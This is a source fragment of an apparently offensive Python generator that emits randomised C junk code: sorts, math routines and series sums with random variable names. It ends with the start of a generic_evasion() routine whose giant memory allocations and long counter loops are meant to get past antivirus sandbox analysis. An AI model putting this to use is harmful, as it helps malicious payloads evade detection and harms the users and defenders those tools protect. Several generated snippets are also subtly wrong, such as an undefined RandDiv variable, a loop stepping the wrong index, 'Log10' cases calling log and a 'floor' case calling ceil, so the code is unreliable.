        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        RandVar2 = varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "float *" + RandVar + " = malloc(sizeof(float)*" + RandRange + ");\n"
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int " + Randflag2 + ";\n"
        Junkcode += "float " + RandVar2 + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = (float)(rand() % 1000) / (float)(rand() % 70);}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag2 + " < (" + RandRange + " - " + Randflag + " - 1);" + Randflag + "++){\n"
        Junkcode += "if(" + RandVar + "[" + Randflag + "] > " + RandVar + "[" + Randflag2 + " + 1]){"
        Junkcode += RandVar2 + " = " + RandVar + "[" + Randflag2 + "];\n"
        Junkcode += RandVar + "[" + Randflag2 + "] = " + RandVar + "[" + Randflag + " + 1];\n"
        Junkcode += RandVar + "[" + Randflag2 + " + 1] = " + RandVar2 + ";}}}\n" 
        Junkcode += "free(" + RandVar + ");\n"


    elif number == 31: # Gnome Sort int array

        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randtemp = varname_creator()
        Randflag = varname_creator() 
        Randflag2 = varname_creator() 

        Junkcode += "int *" + RandVar + " = malloc(sizeof(int)*" + RandRange + ");\n"
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int " + Randtemp + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 10000;}\n"
        Junkcode += Randflag + "=0;\n"
        Junkcode += "while(" + Randflag + " < " + RandRange + "){\n"
        Junkcode += "if(" + Randflag + " == 0 || " + RandVar + "[" + Randflag + "-1] <= " + RandVar + "[" + Randflag + "]){\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += "}else{\n"
        Junkcode += Randtemp + " = " + RandVar + "[" + Randflag + "-1];\n"
        Junkcode += RandVar + "[" + Randflag + "-1] = " + RandVar + "[" + Randflag + "];\n"
        Junkcode += RandVar + "[" + Randflag + "] = " + Randtemp + ";\n"
        Junkcode += Randflag + " = " + Randflag + "-1;}}\n"
        Junkcode += "free(" + RandVar + ");\n"

    elif number == 32: # Gnome Sort float array

        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randtemp = varname_creator()
        Randflag = varname_creator() 
        Randflag2 = varname_creator() 

        Junkcode += "float *" + RandVar + " = malloc(sizeof(float)*" + RandRange + ");\n"
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float " + Randtemp + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = (float)(rand() % 1000) / (float)(rand() % 100);}\n"
        Junkcode += Randflag + "=0;\n"
        Junkcode += "while(" + Randflag + " < " + RandRange + "){\n"
        Junkcode += "if(" + Randflag + " == 0 || " + RandVar + "[" + Randflag + "-1] <= " + RandVar + "[" + Randflag + "]){\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += "}else{\n"
        Junkcode += Randtemp + " = " + RandVar + "[" + Randflag + "-1];\n"
        Junkcode += RandVar + "[" + Randflag + "-1] = " + RandVar + "[" + Randflag + "];\n"
        Junkcode += RandVar + "[" + Randflag + "] = " + Randtemp + ";\n"
        Junkcode += Randflag + " = " + Randflag + "-1;}}\n"
        Junkcode += "free(" + RandVar + ");\n"

    elif number == 33: # Last Armstrong numbers in range

        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator() 
        RandVar2 = varname_creator() 
        Randflag = varname_creator() 
        Randflag2 = varname_creator()
        RandLastArmN = varname_creator()

        Junkcode += "int " + RandLastArmN + ";\n"
        Junkcode += "int " + RandVar + "," + Randflag + "," + RandVar2 + "," + Randflag2 + ";\n"
        Junkcode += "for(" + Randflag + " = 1;" + Randflag + " <= " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + " = 0;\n"
        Junkcode += RandVar2 + " = " + Randflag + ";\n"
        Junkcode += "while(" + RandVar2 + " != 0){\n"
        Junkcode += Randflag2 + " = " + RandVar2 + "%10;\n"
        Junkcode += RandVar + " += " + Randflag2 + "*" + Randflag2 + "*" + Randflag2 + ";\n"
        Junkcode += RandVar2 + " = " + RandVar2 + "/10;}\n"
        Junkcode += "if(" + RandVar + " == " + Randflag + "){\n"
        Junkcode += RandLastArmN + " = " + Randflag + ";}}\n"  
    
    elif number == 34: # ODD or EVEN 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 
        RandODD = varname_creator()
        RandEVEN= varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int *" + RandVar + " = malloc(sizeof(int)*" + RandRange + ");\n"
        Junkcode += "int " + RandODD + " = 0;\n"
        Junkcode += "int " + RandEVEN + " = 0;\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 100000;}\n"
        Junkcode += Randflag + " = " + "0;\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += "if(" + RandVar + "[" + Randflag + "]&1){\n"
        Junkcode += RandODD + " += 1;\n"
        Junkcode += "}else if(!(" + RandVar + "[" + Randflag + "]&1)){\n"
        Junkcode += RandEVEN + " += 1;}}\n"
        Junkcode += "free(" + RandVar + ");\n"

    elif number == 35: # ODD or EVEN 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 
        RandODD = varname_creator()
        RandEVEN= varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int *" + RandVar + " = malloc(sizeof(int)*" + RandRange + ");\n"
        Junkcode += "int " + RandODD + " = 0;\n"
        Junkcode += "int " + RandEVEN + " = 0;\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 1000;\n"
        Junkcode += "if(" + RandVar + "[" + Randflag + "]&1){\n"
        Junkcode += RandODD + " += 1;\n"
        Junkcode += "}else if(!(" + RandVar + "[" + Randflag + "]&1)){\n"
        Junkcode += RandEVEN + " += 1;}}\n"
        Junkcode += "free(" + RandVar + ");\n"



    elif number == 36: # Slow pi calc 1


        RandRange = str(random.randint(10*H,99*H))
        Randflag = varname_creator() 
        RandPI = varname_creator()

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "float " + RandPI + "=0;\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandPI + " += (powf(-1," + Randflag + "+ 1.000))/(2.000*" + Randflag + "-1.000);}\n"
        Junkcode += RandPI + " = " + RandPI + "*4;\n"

    elif number == 37: # Slow pi calc 2


        RandRange = str(random.randint(10*H,99*H))
        Randflag = varname_creator() 
        RandPI = varname_creator()
 
        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double " + RandPI + "=0;\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandPI + " += (pow(-1," + Randflag + "+ 1.000))/(2.000*" + Randflag + "-1.000);}while(" + Randflag + " < " + RandRange + "-1);\n"
        Junkcode += RandPI + " = " + RandPI + "*4;\n"   

    elif number == 38: # Ceil routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        RandVar2 = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "double *" + RandVar2 + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar2 + "[" + Randflag + "] = ceil(" + RandVar + "[" + Randflag + "]);}\n"

    elif number == 39: # Ceil routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        RandVar2 = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + " = -1;\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "double *" + RandVar2 + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);\n"
        Junkcode += RandVar2 + "[" + Randflag + "] = ceil(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"


    elif number == 40: # Floor routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        RandVar2 = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "double *" + RandVar2 + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar2 + "[" + Randflag + "] = floor(" + RandVar + "[" + Randflag + "]);}\n"

    elif number == 41: # Floor routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        RandVar2 = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + " = -1;\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "double *" + RandVar2 + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);\n"
        Junkcode += RandVar2 + "[" + Randflag + "] = ceil(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"


    elif number == 42: # Acos routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        RandVar2 = varname_creator()
        Randflag = varname_creator() 
 
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = acos(" + RandVar + "[" + Randflag + "]);}\n"

    elif number == 43: # Acos routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);\n"
        Junkcode += RandVar + "[" + Randflag + "] = acos(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 44: # Asin routine 1

        RandRange = str(random.randint(10*H,99*H))
        Randflag = varname_creator()
        RandVar = varname_creator()

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = asin(" + RandVar + "[" + Randflag + "]);}\n"

    elif number == 45: # Asin routine 2

        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);\n"
        Junkcode += RandVar + "[" + Randflag + "] = asin(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 46: # Atan routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = ((double)rand() / (double)(RAND_MAX));}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = atan(" + RandVar + "[" + Randflag + "]);}\n"

    elif number == 47: # Atan routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + "[" + Randflag + "] = ((double)rand() / (double)(RAND_MAX));\n"
        Junkcode += RandVar + "[" + Randflag + "] = atan(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 48: # Fabs routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = fabs(" + RandVar + "[" + Randflag + "]);}\n"


    elif number == 49: # Fabs routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 
 
        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + "[" + Randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);\n"
        Junkcode += RandVar + "[" + Randflag + "] = fabs(" + RandVar + "[" + Randflag + "]);}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 50: # Exp routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double " + RandVar + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + " = exp((double)(" + str(random.randint(2,10)) + "*rand() / (double)(RAND_MAX)));}\n"


    elif number == 51: # Exp routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double " + RandVar + ";\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + " = exp((double)(" + str(random.randint(2,10)) + "*rand() / (double)(RAND_MAX)));}while(" + Randflag + " < " + RandRange + "-1);\n"


    elif number == 52: # Ln routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double " + RandVar + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + " = log((double)(" + str(random.randint(20,1000)) + "*rand() / (double)(RAND_MAX)));}\n"


    elif number == 53: # Ln routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double " + RandVar + ";\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + " = log((double)(" + str(random.randint(20,1000)) + "*rand() / (double)(RAND_MAX)));}while(" + Randflag + " < " + RandRange + "-1);\n"


    elif number == 54: # Log10 routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double " + RandVar + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + " = log((double)(" + str(random.randint(20,1000)) + "*rand() / (double)(RAND_MAX)));}\n"


    elif number == 55: # Log10 routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double " + RandVar + ";\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + " = log((double)(" + str(random.randint(20,1000)) + "*rand() / (double)(RAND_MAX)));}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 56: # Fmod routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = ((double)rand() / (double)(RAND_MAX));}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = fmod(" + RandVar + "[" + Randflag + "],(double)(rand() % 100));}\n"

    elif number == 57: # Fmod routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double *" + RandVar + " = malloc(sizeof(double)*" + RandRange + ");\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += RandVar + "[" + Randflag + "] = ((double)rand() / (double)(RAND_MAX));\n"
        Junkcode += RandVar + "[" + Randflag + "] = fmod(" + RandVar + "[" + Randflag + "],(double)(rand() % 100));}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 58: # Ldexp routine 1


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 
        Randinteger = varname_creator()

        Junkcode += "int " + Randinteger + ";\n"
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "double " + RandVar + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += Randinteger + " = rand() % " + str(random.randint(16,32)) + ";\n"
        Junkcode += RandVar + " = ldexp((double)(rand() / (double)(RAND_MAX))," + Randinteger + ");}\n"


    elif number == 59: # Ldexp routine 2


        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        Randflag = varname_creator() 
        Randinteger = varname_creator()

        Junkcode += "int " + Randinteger + ";\n"
        Junkcode += "int " + Randflag + "=-1;\n"
        Junkcode += "double " + RandVar + ";\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += Randinteger + " = rand() % " + str(random.randint(16,32)) + ";\n"
        Junkcode += RandVar + " = ldexp((double)(rand() / (double)(RAND_MAX))," + Randinteger + ");}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 60: # Series E 1\n


        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 
         

        Junkcode += "int " + Randflag + "=0;\n"
        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + Randflag + ");\n"
        Junkcode += "if(" + Randsum + " == 2.00)break;}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 61: # Series E 1\n


        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 
 
        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "for(int " + Randflag + "=0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + Randflag + ");\n"
        Junkcode += "if(" + Randsum + " == 2.00)break;}\n"

    elif number == 62: # Series E 1\n*n


        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "int " + Randflag + "=0;\n"
        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + "++;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + Randflag + "*" + Randflag + ");\n"
        Junkcode += "if(" + Randsum + " == 2.00)break;}while(" + Randflag + " < " + RandRange + "-1);\n"

    elif number == 63: # Series E 1\pow(n,2)


        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "for(int " + Randflag + "=0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / pow((double)" + Randflag + ",2));\n"
        Junkcode += "if(" + Randsum + " == 2.00)break;}\n"

    elif number == 64: # Geometric series 1

        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "double " + RandDiv + "=1;\n"
        Junkcode += "for(int " + Randflag + "=0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){;\n"
        Junkcode += RandDiv + "=" + RandDiv + "*2;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + RandDiv + ");\n"
        Junkcode += "if(" + Randsum + " == 1.00)break;}\n"

    elif number == 65: # Geometric series 2

        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "double " + RandDiv + "=1;\n"
        Junkcode += "int " + Randflag + "=0;\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + " += 1;\n"
        Junkcode += RandDiv + "=" + RandDiv + "* 2;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + RandDiv + ");\n"
        Junkcode += "if(" + Randsum + " == 1.00)break;}while(" + Randflag + " < " + RandRange + ");\n"

    elif number == 66: # Geometric series 3

        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "double " + RandDiv + "=1;\n"
        Junkcode += "for(int " + Randflag + "=0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + RandDiv + ");\n"
        Junkcode += RandDiv + " *= 4;\n"
        Junkcode += "if(" + Randsum + " == 1.33333333333333333333)break;}\n"

    elif number == 67: # Geometric series 4

        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "double " + RandDiv + "=1;\n"
        Junkcode += "int " + Randflag + "=0;\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + " += 1;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + RandDiv + ");\n"
        Junkcode += RandDiv + "*=4;\n"
        Junkcode += "if(" + Randsum + " == 1.33333333333333333333)break;}while(" + Randflag + " < " + RandRange + ");\n"

    elif number == 68: # Geometric series 5

        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "double " + RandDiv + "=1;\n"
        Junkcode += "for(int " + Randflag + "=0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){;\n"
        Junkcode += RandDiv + " *= 4;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + RandDiv + ");\n"
        Junkcode += "if(" + Randsum + " == 0.33333333333333333333)break;}\n"

    elif number == 69: # Geometric series 4

        RandRange = str(random.randint(10*H,99*H))
        Randsum = varname_creator()
        Randflag = varname_creator() 

        Junkcode += "double " + Randsum + "=0;\n"
        Junkcode += "double " + RandDiv + "=1;\n"
        Junkcode += "int " + Randflag + "=0;\n"
        Junkcode += "do{\n"
        Junkcode += Randflag + " += 1;\n"
        Junkcode += RandDiv + " *= 4;\n"
        Junkcode += Randsum + " = " + Randsum + " + (1 / " + RandDiv + ");\n"
        Junkcode += "if(" + Randsum + " == 0.33333333333333333333)break;}while(" + Randflag + " < " + RandRange + ");\n"

    elif number == 70: # Shaker Sort

        RandRange = str(random.randint(10*H,99*H))
        Randflag = varname_creator() 
        Randflag2 = varname_creator() 
        Randtemp = varname_creator() 
        RandVar = varname_creator() 

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int *" + RandVar + " = malloc(sizeof(int)*" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 10000;}\n"
        Junkcode += "int " + Randflag2 + ";\n"
        Junkcode += "int " + Randtemp + ";\n"
        Junkcode += "for (" + Randflag2 + " = 1; " + Randflag2 + " <= " + RandRange + " / 2; " + Randflag2 + "++){\n"
        Junkcode += "for (" + Randflag + " = " + Randflag2 + " - 1; " + Randflag + " < " + RandRange + " - " + Randflag2 + "; " + Randflag + "++){\n"
        Junkcode += "if (" + RandVar + "[" + Randflag + "] > " + RandVar + "[" + Randflag + "+1]){\n"
        Junkcode += Randtemp + " = " + RandVar + "[" + Randflag + "];\n"
        Junkcode += RandVar + "[" + Randflag + "] = " + RandVar + "[" + Randflag + "+1];\n"
        Junkcode += RandVar + "[" + Randflag + "+1] = " + Randtemp + ";}}\n"
        Junkcode += "for (" + Randflag + " = " + RandRange + " - " + Randflag2 + " - 1; " + Randflag + " >= " + Randflag2 + "; " + Randflag + "--){\n"
        Junkcode += "if (" + RandVar + "[" + Randflag + "] < " + RandVar + "[" + Randflag + "-1]){\n"
        Junkcode += Randtemp + " = " + RandVar + "[" + Randflag + "];\n"
        Junkcode += RandVar + "[" + Randflag + "] = " + RandVar + "[" + Randflag + "-1];\n"
        Junkcode += RandVar + "[" + Randflag + "-1] = " + Randtemp + ";}}}\n"

    return Junkcode

def generic_evasion():

    number = random.randint(1,7)



    if number == 1: # Giant memory allocation 

        Randmem = varname_creator()
        Randbig = str(random.randrange(30000000,100000000,1024))
        Evasion_code = ""
        Evasion_code += "char *" + Randmem + " = NULL;\n"
        Evasion_code += Randmem + " = (char *) malloc("+ Randbig + ");\n"
        Evasion_code += "if ("+ Randmem + "!=NULL){\n"
        Evasion_code += "memset(" + Randmem + ",00," + Randbig + ");\n"
        Evasion_code += "free(" + Randmem + ");\n"


    elif number == 2: # Loooooong Counter 

        Randbig = str(random.randrange(100000000,990000000,1000))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randcpt + "  = 0;\n"
        Evasion_code += "int " + Randi + " = 0;\n"
        Evasion_code += "for("+ Randi + " = 0;" + Randi + " < " + Randbig + "; " + Randi + "++){\n"
        Evasion_code += Randcpt + "++;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randbig + "){\n"


    elif number == 3: # Loooooong Counter 2

        Randbig = str(random.randrange(100000000,990000000,1000))
        Randcpt= varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randcpt + "  = 0;\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + "++;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randbig + "){\n"


    elif number == 4: # am i zero?

        Randbig = str(random.randrange(100000000,990000000,10))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randi + " = 0;\n"
        Evasion_code += "int " + Randcpt + "  = " + Randbig + ";\n"
